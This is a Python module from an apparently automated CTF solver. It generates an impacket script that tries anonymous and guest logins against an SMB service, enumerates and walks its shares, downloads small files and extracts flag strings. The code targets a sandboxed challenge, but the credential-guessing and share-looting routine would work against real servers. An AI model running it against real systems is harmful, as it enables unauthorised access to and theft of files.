"""SMB / file-share instances: a `nc host port` that actually speaks SMB (a Samba box,
often on a non-standard port). The flag is usually a file sitting on a world-readable
share you can reach with a null/guest session.

This runs the same generate->run->observe loop as the other live paths: a generated
`impacket` script connects, tries an anonymous login, enumerates the shares, walks them,
downloads the small files and prints their contents -- all *inside the sandbox*, so under
`--container` the egress firewall confines it to the challenge's own target.

`impacket` is an optional dependency (the `smb` extra); the script degrades cleanly to a
"not installed" note when it is missing, so the stdlib control plane is unaffected.
"""
from __future__ import annotations

import re
from typing import Optional

from ..models import Target
from .base import SolveContext
from .runner import run_script

# A generic CTF flag shape (academy{...}, picoCTF{...}, flag{...}, CTF{...}, ...), used as
# a fallback when the challenge's own flag_format is the restrictive default and the real
# prefix differs.
_GENERIC_FLAG = re.compile(r"[A-Za-z0-9_]{2,}\{[^}]{1,256}\}")

SMB_SCRIPT = r'''
import io, sys
host = sys.argv[1]
port = int(sys.argv[2])
try:
    from impacket.smbconnection import SMBConnection
except Exception as exc:
    print("SMB_NO_IMPACKET:", exc)
    sys.exit(3)

def fresh():
    return SMBConnection(remoteName=host, remoteHost=host, sess_port=port, timeout=12)

conn = None
for user, pw in (("", ""), ("guest", ""), ("anonymous", ""), ("guest", "guest")):
    try:
        c = fresh()
        c.login(user, pw)
        conn = c
        print("SMB_LOGIN_OK user=%r" % user)
        break
    except Exception as exc:
        print("SMB_LOGIN_FAIL user=%r: %s" % (user, exc))

if conn is None:
    print("SMB_CONNECT_FAIL")
    sys.exit(4)

print("SMB_SERVER:", conn.getServerName(), conn.getServerOS())
SKIP = {"IPC$", "ADMIN$", "PRINT$"}
MAX = 1048576  # don't pull anything huge

def walk(share, base=""):
    try:
        items = conn.listPath(share, base + "*")
    except Exception as exc:
        print("  ! list %s\\%s: %s" % (share, base, exc))
        return
    for it in items:
        name = it.get_longname()
        if name in (".", ".."):
            continue
        path = base + name
        if it.is_directory():
            print("  [DIR] //%s/%s/" % (share, path))
            walk(share, path + "/")
        else:
            size = it.get_filesize()
            print("  [FILE] //%s/%s (%d bytes)" % (share, path, size))
            if 0 <= size <= MAX:
                buf = io.BytesIO()
                try:
                    conn.getFile(share, path, buf.write)
                except Exception as exc:
                    print("  ! get %s: %s" % (path, exc))
                    continue
                data = buf.getvalue()
                try:
                    text = data.decode("utf-8")
                except Exception:
                    text = data.decode("latin-1", "replace")
                print("=== CONTENT //%s/%s ===" % (share, path))
                print(text)

try:
    shares = conn.listShares()
except Exception as exc:
    print("SMB_SHARES_FAIL:", exc)
    sys.exit(5)

for s in shares:
    name = s['shi1_netname'][:-1]
    print("SHARE: %s" % name)
    if name.upper() in SKIP:
        continue
    walk(name)
'''


def looks_like_smb(ctx: SolveContext, remote: Target) -> bool:
    """Prefer the SMB path when the challenge hints at it (text or the classic ports)."""
    if remote.port in (139, 445):
        return True
    text = f"{ctx.challenge.name} {ctx.challenge.description}".lower()
    recon = " ".join(ctx.understanding.recon).lower() if ctx.understanding else ""
    return any(k in text or k in recon for k in ("smb", "samba", "cifs", "share"))


def flags_from_output(ctx: SolveContext, out: str) -> list[str]:
    """Flags in the enumerated file contents: the challenge's own format first, then a
    generic CTF shape as a fallback (real prefixes like academy{...} differ from flag{})."""
    found: list[str] = []
    try:
        found += re.findall(ctx.challenge.flag_format, out)
    except re.error:
        pass
    found += _GENERIC_FLAG.findall(out)
    return list(dict.fromkeys(found))


async def solve_smb(ctx: SolveContext, remote: Target) -> tuple[Optional[str], list[str]]:
    """Enumerate SMB shares and pull the flag file. Returns (flag | None, steps)."""
    steps: list[str] = []
    if not remote.host or not remote.port:
        return None, steps

    ctx.trace.note("solve", f"SMB enumeration of {remote.host}:{remote.port}")
    res, _ = await run_script(ctx, "smb_enum.py", SMB_SCRIPT,
                              args=[remote.host, str(remote.port)], timeout=90)
    out = (res.stdout or "") + ("\n" + res.stderr if res.stderr else "")

    if "SMB_NO_IMPACKET" in out:
        steps.append("SMB probe skipped: impacket not installed (pip install '.[smb]')")
        return None, steps
    if "SMB_CONNECT_FAIL" in out or not res.ok and "SMB_LOGIN_OK" not in out:
        steps.append(f"{remote.host}:{remote.port} is not an anonymous SMB service")
        return None, steps

    if "SMB_LOGIN_OK" in out:
        shares = [l.split("SHARE: ", 1)[1] for l in out.splitlines() if l.startswith("SHARE: ")]
        files = [l.strip() for l in out.splitlines() if l.strip().startswith("[FILE]")]
        steps.append("SMB: anonymous session established")
        if shares:
            steps.append("shares: " + ", ".join(shares))
        if files:
            steps.append(f"enumerated {len(files)} file(s) across the shares")

    flags = flags_from_output(ctx, out)
    if flags:
        steps.append("flag recovered from an SMB share")
        return flags[0], steps

    steps.append("SMB enumerated but no flag found in readable files")
    return None, steps
